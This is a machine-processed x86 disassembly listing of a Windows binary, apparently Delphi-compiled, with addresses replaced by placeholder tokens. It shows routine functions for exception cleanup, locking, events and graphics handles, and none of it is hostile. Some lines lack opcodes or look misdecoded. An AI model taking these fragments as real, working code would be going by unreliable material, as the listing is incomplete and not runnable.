retn
sub_419ea8
mov eax [ eax + 0x18 ]
retn
sub_419fae
jmp sub_403980
sub_419fb5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fd2
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_419fcb
jmp sub_403980
sub_419fd2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a05c
jmp sub_403980
sub_41a074
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a130
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41a1d9
jmp sub_403980
sub_41a1e0
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a1ec
mov eax [ ebp + 0x4 ]
retn
sub_41a222
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a270
jmp sub_403980
sub_41a277
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a336
jmp sub_403980
sub_41a33d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a35f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
sub_41a358
jmp sub_403980
sub_41a35f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a368
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41a370
xor eax eax
retn
sub_41a3b9
jmp sub_403980
sub_41a3c0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41a4d3
jmp sub_403980
sub_41a4da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a56f
jmp sub_403980
sub_41a576
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a5f4
jmp sub_403980
sub_41a5fb
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a6cb
jmp sub_403980
sub_41a6d2
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a788
jmp sub_403980
sub_41a78f
pop esi
pop ecx
pop ebp
retn
sub_41a814
jmp sub_403980
sub_41a81b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a838
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_41a831
jmp sub_403980
sub_41a838
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a8c4
jmp sub_403980
sub_41a8e1
jmp sub_403980
sub_41a8e8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a924
retn
sub_41a9a7
jmp sub_403980
sub_41a9ae
mov eax [ ebp - 0x8 ]
call sub_41d5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9d3
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_41a9cc
jmp sub_403980
sub_41a9d3
mov esp ebp
pop ebp
retn
sub_41aa23
jmp sub_403980
sub_41aa2a
pop esi
pop ecx
pop ebp
retn
sub_41aa7d
jmp sub_403980
sub_41aa84
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41aa8c
retn
sub_41ab07
jmp sub_403980
sub_41ab0e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41abab
jmp sub_403980
sub_41abb2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abcf
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
sub_41abc8
jmp sub_403980
sub_41abcf
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41abd4
retn
sub_41ac74
jmp sub_403980
sub_41ac7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41acfa
jmp sub_403980
sub_41ad01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ad08
mov eax edx
mov edx ecx
call sub_40804c
retn
sub_41ad14
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41ad2c
sub_41ada4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41ae14
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41ae30
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41b024
mov eax [ eax + 0x18 ]
retn
sub_41b028
mov eax [ eax + 0x14 ]
retn
sub_41b0c4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41b2d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027ac
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41b30c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41b324
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41b338
mov edx sub_41b324
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41b380
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_40804c
retn
mov eax edx
mov edx ecx
call sub_408014
retn
sub_41b41c
retn
sub_41b714
jmp sub_403980
sub_41b71b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b77c
jmp sub_403980
sub_41b783
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b78c
xor ecx ecx
call sub_41b794
retn
sub_41b7e4
jmp sub_403980
sub_41b7eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b82c
mov eax [ eax + 0x4 ]
call sub_4086a8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b83c
mov eax [ eax + 0x4 ]
call sub_4086d4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b878
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41ba21
jmp sub_403980
sub_41ba80
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41bb10
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41bb60
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41bd4b
jmp sub_403980
sub_41bd52
mov esp ebp
pop ebp
retn
sub_41bdfc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
retn
sub_41be84
mov [ eax + 0x18 ] edx
retn
sub_41c000
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_41506c
retn
sub_41c087
jmp sub_403980
sub_41c08e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c13a
jmp sub_403980
sub_41c141
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c2e5
jmp sub_403980
sub_41c337
jmp sub_403980
sub_41c356
jmp sub_403980
sub_41c35d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c37c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41c375
jmp sub_403980
sub_41c37c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c41f
jmp sub_403980
sub_41c4a7
jmp sub_403980
sub_41c4b4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
pop ebx
retn
sub_41c4cc
mov eax [ rw-data ]
call sub_41c4b4
retn
sub_41c504
push ebx
call sub_414ea0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41c4cc
sub_41c671
jmp sub_403980
sub_41c678
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f7c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41c798
jmp sub_403980
sub_41c79f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c896
jmp sub_403980
sub_41c8b3
jmp sub_403980
sub_41c8ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c9b8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41b39c
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41ca7c
push ebx
mov ebx eax
mov eax ebx
call sub_41e430
cmp al 0x9
sete al
pop ebx
retn
sub_41cadb
jmp sub_403980
sub_41cae2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41cb88
jmp sub_403980
sub_41cb8f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cba8
[ eax + 0x75 ]
sub_41ce0e
jmp sub_4036cc
sub_41ce3a
jmp sub_4036cc
sub_41cedc
jmp sub_4036cc
sub_41cf7f
jmp sub_4036cc
sub_41d157
jmp sub_4036cc
sub_41d199
jmp sub_403980
sub_41d1c9
jmp sub_403980
sub_41d1d0
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d23f
jmp sub_403980
sub_41d316
jmp sub_403980
sub_41d31d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d5f0
mov dl 0x1
call sub_41c558
retn
sub_41d731
jmp sub_403980
sub_41d738
pop ebx
mov esp ebp
pop ebp
retn
sub_41d740
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41e540
mov eax [ rw-data ]
call sub_41c4b4
pop ebp
retn
j_sub_4037f8#5
jmp sub_4037f8
j_sub_4037f8#3
jmp sub_4037f8
sub_41d92c
jmp sub_403980
sub_41d933
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41da13
jmp sub_403980
sub_41da1a
mov esp ebp
pop ebp
retn
sub_41dad2
jmp sub_403980
sub_41dad9
pop ecx
pop ecx
pop ebp
retn
sub_41dddb
jmp sub_403980
sub_41dde2
pop ebx
mov esp ebp
pop ebp
retn
sub_41e087
jmp sub_403980
sub_41e08e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4031ec
retn
sub_41e0a7
jmp sub_403980
sub_41e0cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036cc
sub_41e102
jmp sub_4036cc
sub_41e141
jmp sub_403980
sub_41e148
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e16a
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fa0
retn
sub_41e163
jmp sub_403980
sub_41e16a
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1f1
jmp sub_4036cc
sub_41e21e
jmp sub_403980
sub_41e225
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e230
push ecx
mov edx esp
mov ecx 0x4
call sub_41c9f4
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41c4b4
sub_41e33d
jmp sub_403980
sub_41e344
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e423
jmp sub_403980
sub_41e42a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e480
jmp sub_403980
sub_41e487
pop ebx
pop ecx
pop ebp
retn
sub_41e6cf
jmp sub_403980
sub_41e6d6
pop ecx
pop ecx
pop ebp
retn
sub_41e719
jmp sub_403980
sub_41e720
pop ebx
pop ecx
pop ebp
retn
sub_41e7bc
jmp sub_403980
sub_41e7c3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e871
jmp sub_403980
sub_41e878
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e884
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41eadf
jmp sub_403980
sub_41eae6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb0b
mov eax [ ebp - 0x8 ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41eb04
jmp sub_403980
sub_41eb0b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb30
lea eax [ ebp - 0x1c ]
call sub_4058a0
lea eax [ ebp - 0x18 ]
call sub_403f7c
retn
sub_41eb29
jmp sub_403980
sub_41eb30
pop ebx
mov esp ebp
pop ebp
retn
sub_41ed42
jmp sub_403980
sub_41ed49
pop ebx
mov esp ebp
pop ebp
retn
sub_41ed7c
mov eax [ eax + 0x30 ]
call sub_418c68
retn
sub_41edec
call sub_41ef1c
retn
sub_41ee30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41be84
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41ef0b
jmp sub_403980
sub_41ef12
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41ef1c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b600
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41ef34
test dl dl
je r-xdata
mov dl 0x8
call sub_4210a0
retn
mov dl 0x9
call sub_4210a0
retn
sub_41ef8b
jmp sub_403980
sub_41ef92
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f02a
jmp sub_403980
sub_41f031
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f1cf
jmp sub_403980
sub_41f1d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f517
jmp sub_403980
sub_41f559
jmp sub_403980
sub_41f5b8
jmp sub_403980
sub_41f5bf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f824
mov dl 0x1
call sub_4210a0
retn
sub_41f82c
xor edx edx
call sub_4210a0
retn
sub_41f925
jmp sub_403980
sub_41fafb
jmp sub_403980
sub_41fb02
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fcd0
jmp sub_403980
sub_41fcd7
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fdad
jmp sub_403980
sub_41fdb4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41fecb
jmp sub_403980
sub_41fed2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42008c
jmp sub_403980
sub_420093
pop ecx
pop ebp
retn
sub_42011e
jmp sub_403980
sub_420125
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42018c
jmp sub_403980
sub_420193
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420211
jmp sub_403980
sub_420218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420235
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_42022e
jmp sub_403980
sub_420235
pop ebx
pop ecx
pop ebp
retn
sub_4202f0
jmp sub_403980
sub_4202f7
pop ebx
pop ecx
pop ebp
retn
sub_4203cd
jmp sub_403980
sub_4203d4
pop ecx
pop ebp
retn
sub_4203d8
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_4204df
jmp sub_403980
sub_4204e6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42068d
jmp sub_403980
sub_42070c
jmp sub_403980
sub_420713
mov esp ebp
pop ebp
retn
sub_4207e1
jmp sub_403980
sub_4207e8
pop ebx
mov esp ebp
pop ebp
retn
sub_42089b
jmp sub_403980
sub_4208a2
pop ebx
mov esp ebp
pop ebp
retn
sub_420901
jmp sub_403980
sub_420908
mov esp ebp
pop ebp
retn
sub_420d6d
jmp sub_403980
sub_420dc7
jmp sub_403980
sub_420dd8
jmp sub_4036cc
sub_420e34
jmp sub_403980
sub_420e3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420e9a
jmp sub_403980
sub_420ea1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420ea8
mov edx rw-data
mov ecx 0x4
call sub_41ee48
retn
sub_420fdd
jmp sub_403980
sub_420fe4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_421092
jmp sub_403980
sub_421099
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4210d8
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cfdc
sub_42110c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_421124
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_421130
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_421124
sub_421256
jmp sub_4036cc
sub_421285
jmp sub_403980
sub_4212bb
jmp sub_403980
sub_4212c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212e1
push rw-data
call LeaveCriticalSection
retn
sub_4212da
jmp sub_403980
sub_4212e1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4213b0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_42158c
sub_421410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d540
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_421424
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d540
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_421438
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f758
retn
sub_421444
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f758
retn
sub_4216ec
xor eax eax
retn
sub_4216f0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4216f8
xor eax eax
retn
sub_4216fc
retn
sub_421700
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fd0
pop esi
pop ebx
retn
sub_421714
mov eax [ eax + 0x4 ]
retn
sub_421718
retn
sub_42171c
xor eax eax
retn
sub_421720
retn
sub_421724
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_421730
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_42173c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_421748
retn
sub_42174c
xchg edx eax
call sub_41d1e4
retn
sub_421754
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4217dc
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4033e8
pop esi
retn
sub_4217f0
retn
sub_4218d0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fd0
pop esi
pop ebx
retn
sub_421910
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_421a5c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403434
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_421a74
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_421afc
retn
sub_421b44
retn
sub_421b7c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421b94
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421db8
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4033e8
pop esi
pop ebx
retn
sub_421bdc
mov al 0x1
retn
sub_421be0
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421be8
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421c90
xor eax eax
retn
sub_421c94
retn
sub_421cc0
retn
sub_421d58
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421d6c
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418c68
retn
sub_421eb3
jmp sub_4036cc
sub_421eb8
mov ebx 0x1
call sub_403a34
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421f1b
jmp sub_4036cc
sub_421f20
mov ebx 0x80030103
call sub_403a34
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421f9e
jmp sub_4036cc
sub_421fa3
mov ebx 0x80030009
call sub_403a34
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_422001
jmp sub_4036cc
sub_422006
mov ebx 0x8000ffff
call sub_403a34
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4221d1
jmp sub_403980
sub_4221e2
jmp sub_4036cc
sub_4221e7
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422210
lea eax [ ebp + 0xc ]
call sub_4058a0
retn
sub_422209
jmp sub_403980
sub_422210
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_42221c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_422228
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_422234
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_422240
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4222af
jmp sub_4036cc
sub_4222b4
mov esi 0x8000ffff
call sub_403a34
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4222c8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_422335
jmp sub_403980
sub_42233c
mov eax [ rw-data ]
call sub_4031ec
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42234c
call sub_4183ac
retn
sub_422414
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_4225b8
jmp sub_403980
sub_4225bf
pop ebp
retn
sub_42264d
jmp sub_403980
sub_422654
pop ebp
retn
sub_422985
jmp sub_403980
sub_42298c
pop ebp
retn
sub_422990
sub [ rw-data ] 0x1
retn
sub_423a18
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_423a8c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_423b00
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423b0c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423bec
jmp sub_403980
sub_423bf3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423c83
jmp sub_403980
sub_423d15
jmp sub_403980
sub_423d1c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423d80
jmp sub_403980
sub_423d87
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423def
jmp sub_403980
sub_423df6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423e99
jmp sub_403980
sub_423ea0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4242f8
push 0x33
mov ecx rw-data
call sub_4186e8
retn
sub_424308
push 0x33
mov ecx rw-data
call sub_4186a8
retn
sub_424318
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_42433c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_424510
push 0x11
mov ecx rw-data
call sub_4186a8
retn
sub_424650
push ebx
mov ebx eax
mov eax ebx
call sub_424318
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42470a
jmp sub_403980
sub_424711
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_424727
jmp sub_403980
sub_424740
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42479d
jmp sub_403980
sub_4247a4
pop ebx
pop ecx
pop ebp
retn
sub_42491d
jmp sub_403980
sub_424945
jmp sub_403980
sub_42494c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4249b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041e0
pop esi
pop ebx
retn
sub_424a2c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_424988
push eax
call MulDiv
neg eax
pop ebx
retn
sub_424aa0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_424ad0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_424bee
jmp sub_403980
sub_424bf5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_424c0b
jmp sub_403980
sub_424c81
jmp sub_403980
sub_424c88
pop ebx
pop ecx
pop ebp
retn
sub_424c8c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_424d42
jmp sub_403980
sub_424d54
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4033e8
sub_424d68
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424d98
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424ea7
jmp sub_403980
sub_424eae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_424ec4
jmp sub_403980
sub_424f3d
jmp sub_403980
sub_424f44
pop ebx
pop ecx
pop ebp
retn
sub_425075
jmp sub_403980
sub_425088
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_42538c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_425620
jmp sub_403980
sub_425627
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425630
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_425668
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4257b4
retn
sub_42587d
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_425894
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_425980
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
